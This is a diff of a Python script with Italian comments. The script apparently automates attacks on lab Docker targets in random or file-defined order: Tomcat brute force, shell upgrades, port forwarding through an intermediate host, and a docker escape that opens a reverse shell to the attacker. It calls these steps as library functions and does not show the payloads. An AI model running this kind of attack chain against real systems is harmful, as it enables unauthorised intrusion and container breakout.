@@ -34,10 +34,11 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     #CASO 0: PROCEDURA IN ORDINE CASUALE
     if not attack_sequence_file:
-        print(f"{C.COL_YELLOW}[*]\n Attacking with random attack sequence")
+        print(f"{C.COL_YELLOW}\n[*]Attacking with random attack sequence{C.COL_RESET}")
         
         #Vengono estratte ed attaccate, una ad una, tutte le macchine target
         while machines:
+            print("\n")
             target_ip = machines.pop(0)
             print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
 
@@ -64,7 +65,6 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 attack_name = attack_sequence_list[attack_sequence_index]
                 attack_sequence_index += 1
 
-                #LPORT = C.DEFAULT_LPORT 
                 LPORT = None
                 for p in C.TARGETS_DOCKERS[target_ip]:
                     LPORT = p["exposed_port"]
@@ -88,21 +88,21 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         compromised_machines.add(target_ip)
                         uncompromised_machines.remove(target_ip)
 
+                        #Se l'attacco che ha avuto successo è bruteForce, dopo si fa docker escape
+                        #TODO sistemare
                         if(attack_name=="bruteForce"):
                             print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
                             print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
 
-                        #prepariamo le regole di port forwarding usando la macchina intermedia su cui l'attacco docker escape si connette
-                        #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
-                        #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
-                        #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
+                        #Viene port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
+                        #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
                             mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             escape = mc.docker_escape(docker_escape_attack_object)
                             if(escape):
-                                print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
+                                print(f"{C.COL_GREEN} docker_escape successful!{C.COL_RESET}")
                             else:
-                                print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
+                                print(f"{C.COL_RED} docker_escape failed!{C.COL_RESET}")
                                 break  
 
                         break
@@ -120,26 +120,21 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     #CASO 1: PROCEDURA CON ORDINE LETTO DA FILE
     else:
-        print(f"{C.COL_YELLOW}[*]\n Reading attack sequence from Attack_sequence.json and attacking with that")
-        
+        print(f"{C.COL_YELLOW}\n[*] Reading attack sequence from Attack_sequence.json and attacking with that")
+
+        #Viene estratta dal file la sequenza di attacchi da utilizzare durante la procedura
         with open(attack_sequence_file) as f:
             attack_data = json.load(f)['attack_sequence']
-
         attack_sequence = []
         for ip, attacks in attack_data.items():
             if ip == '':
-                continue  # Salta se l'IP è una stringa vuota
+                continue  
             for attack in attacks:
                 attack_sequence.append((ip, attack))
 
-        visited_ips = set()
-
+        #Vengono iterati tutti gli ip presenti nel file di input e li si prova ad attaccare con tutti gli attacchi ad essi destinati
         for target_ip, attack_name in attack_sequence:
-            if target_ip in visited_ips:
-                continue  # Evita di attaccare nuovamente un IP già visitato
-
             print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
-            visited_ips.add(target_ip)
 
             if atk_sess is not None:
                 met_sess = mc.upgrade_shell(atk_sess)
@@ -155,7 +150,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     router = met_sess
 
 
-            LPORT = C.DEFAULT_LPORT
+            LPORT = None
             for p in C.TARGETS_DOCKERS[target_ip]:
                 LPORT = p["exposed_port"]
                 break
@@ -180,21 +175,21 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         compromised_machines.add(target_ip)
                         uncompromised_machines.remove(target_ip)
 
+                        #Se l'attacco che ha avuto successo è bruteForce, dopo si fa docker escape
+                        #TODO sistemare
                         if(attack_name=="bruteForce"):
                             print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
                             print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
 
-                        #prepariamo le regole di port forwarding usando la macchina intermedia su cui l'attacco docker escape si connette
-                        #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
-                        #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
-                        #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
+                        #Viene port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
+                        #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
                             mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             escape = mc.docker_escape(docker_escape_attack_object)
                             if(escape):
-                                print(f"{C.COL_GREEN}docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
+                                print(f"{C.COL_GREEN} docker_escape successful!{C.COL_RESET}")
                             else:
-                                print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
+                                print(f"{C.COL_RED} docker_escape failed!{C.COL_RESET}")
                                 break  
 
                         break
